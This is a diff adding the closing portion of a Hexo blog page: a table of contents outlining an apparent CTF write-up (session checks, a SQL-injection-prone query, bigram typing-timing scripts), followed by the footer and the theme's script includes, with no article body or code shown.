+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x01-rpdg"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x01 rpdg</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#目录的结构如下："><span class="nav-number">1.0.1.1.</span> <span class="nav-text">目录的结构如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#app目录下："><span class="nav-number">1.0.1.2.</span> <span class="nav-text">app目录下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3行开启session可以在页面间传递数据。"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">3行开启session可以在页面间传递数据。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#5-10行判断是否用户是admin，是就可以拿到flag，不是就返回一个403响应头。"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">5~10行判断是否用户是admin，是就可以拿到flag，不是就返回一个403响应头。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-10行是设置连接数据库的句柄，并且设置数据库的字符集。"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">3~10行是设置连接数据库的句柄，并且设置数据库的字符集。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#就是下载mysqli的扩展。"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">就是下载mysqli的扩展。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#18行准备要执行的语句，并返回语句对象。"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">18行准备要执行的语句，并返回语句对象。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#41行验证密码是否和散列值匹配。"><span class="nav-number">1.0.1.9.</span> <span class="nav-text">41行验证密码是否和散列值匹配。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接-1"><span class="nav-number">1.0.1.10.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#43行验证成功就跳转到-admin-php。"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">43行验证成功就跳转到/admin.php。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#11行匹配sleep和benchmark但是不记住匹配项。"><span class="nav-number">1.0.1.12.</span> <span class="nav-text">11行匹配sleep和benchmark但是不记住匹配项。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#16行明显存在sql注入的情况。"><span class="nav-number">1.0.1.13.</span> <span class="nav-text">16行明显存在sql注入的情况。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接-2"><span class="nav-number">1.0.1.14.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#db目录下："><span class="nav-number">1.0.1.15.</span> <span class="nav-text">db目录下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#scripts目录下："><span class="nav-number">1.0.1.16.</span> <span class="nav-text">scripts目录下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#8-9行将一个列表中的元素两两合并为一个并且，返回成一个新的数组。"><span class="nav-number">1.0.1.17.</span> <span class="nav-text">8~9行将一个列表中的元素两两合并为一个并且，返回成一个新的数组。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#14行将不是字符串的数字和字母替换为空格。"><span class="nav-number">1.0.1.18.</span> <span class="nav-text">14行将不是字符串的数字和字母替换为空格。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#16行定义一个对象。"><span class="nav-number">1.0.1.19.</span> <span class="nav-text">16行定义一个对象。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#17行遍历将txt文件中的字符两个结合在一起的数组。"><span class="nav-number">1.0.1.20.</span> <span class="nav-text">17行遍历将txt文件中的字符两个结合在一起的数组。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#19行将生成的两个字符的字符串分别将其中的字符赋值给char-a，char-b。"><span class="nav-number">1.0.1.21.</span> <span class="nav-text">19行将生成的两个字符的字符串分别将其中的字符赋值给char_a，char_b。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#20-21行判断char-a是否在next-char-map中如果不在就将其设置一个数组对象。"><span class="nav-number">1.0.1.22.</span> <span class="nav-text">20~21行判断char_a是否在next_char_map中如果不在就将其设置一个数组对象。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#22行将char-b添加到next-char-map对象中。"><span class="nav-number">1.0.1.23.</span> <span class="nav-text">22行将char_b添加到next_char_map对象中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#27行删除对象的键为空格的。"><span class="nav-number">1.0.1.24.</span> <span class="nav-text">27行删除对象的键为空格的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#29行对象的拷贝。"><span class="nav-number">1.0.1.25.</span> <span class="nav-text">29行对象的拷贝。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#30行返回next-char-map中键的随机项。"><span class="nav-number">1.0.1.26.</span> <span class="nav-text">30行返回next_char_map中键的随机项。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#32行获取password的最后一个字母。"><span class="nav-number">1.0.1.27.</span> <span class="nav-text">32行获取password的最后一个字母。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#34-37行判断last-char是否在next-char-map中不是就按照上面的步骤。"><span class="nav-number">1.0.1.28.</span> <span class="nav-text">34~37行判断last_char是否在next_char_map中不是就按照上面的步骤。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#38行生成下一个字符。"><span class="nav-number">1.0.1.29.</span> <span class="nav-text">38行生成下一个字符。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#39行删除last-char数组对象。"><span class="nav-number">1.0.1.30.</span> <span class="nav-text">39行删除last_char数组对象。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#40行合并password字符串。"><span class="nav-number">1.0.1.31.</span> <span class="nav-text">40行合并password字符串。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#42行返回一个字符串。"><span class="nav-number">1.0.1.32.</span> <span class="nav-text">42行返回一个字符串。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其余没有必要再分析了。"><span class="nav-number">1.0.1.33.</span> <span class="nav-text">其余没有必要再分析了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-9行导入bcrypt包用来验证口令密文。"><span class="nav-number">1.0.1.34.</span> <span class="nav-text">3~9行导入bcrypt包用来验证口令密文。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#11行是上面分析的内容。"><span class="nav-number">1.0.1.35.</span> <span class="nav-text">11行是上面分析的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#14-15行是定义时间间隔。"><span class="nav-number">1.0.1.36.</span> <span class="nav-text">14~15行是定义时间间隔。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#19-20行上面已经分析过了。"><span class="nav-number">1.0.1.37.</span> <span class="nav-text">19~20行上面已经分析过了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#23-25行返回一个正态随机变量。"><span class="nav-number">1.0.1.38.</span> <span class="nav-text">23~25行返回一个正态随机变量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#33行将输入的字符串中的换行符全部替换为空格。"><span class="nav-number">1.0.1.39.</span> <span class="nav-text">33行将输入的字符串中的换行符全部替换为空格。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#40行遍历text两两组合成的两个字符的字符串，如-Lo-。"><span class="nav-number">1.0.1.40.</span> <span class="nav-text">40行遍历text两两组合成的两个字符的字符串，如(Lo)。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其余大家感兴趣的继续分析……。"><span class="nav-number">1.0.1.41.</span> <span class="nav-text">其余大家感兴趣的继续分析……。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#20行将两个字符同时出现的概率加入到bigram-speeds中。"><span class="nav-number">1.0.1.42.</span> <span class="nav-text">20行将两个字符同时出现的概率加入到bigram_speeds中。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#24-26行计算两个字符出现的时间间隔的平均时间并添加到bigram-means。"><span class="nav-number">1.0.1.43.</span> <span class="nav-text">24~26行计算两个字符出现的时间间隔的平均时间并添加到bigram_means。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#29行按时间也就是速度排序。"><span class="nav-number">1.0.1.44.</span> <span class="nav-text">29行按时间也就是速度排序。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#53行又将字符两两分开。"><span class="nav-number">1.0.1.45.</span> <span class="nav-text">53行又将字符两两分开。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#上面基本分析完毕。"><span class="nav-number">1.0.1.46.</span> <span class="nav-text">上面基本分析完毕。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最后的结果："><span class="nav-number">1.0.1.47.</span> <span class="nav-text">最后的结果：</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">115.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
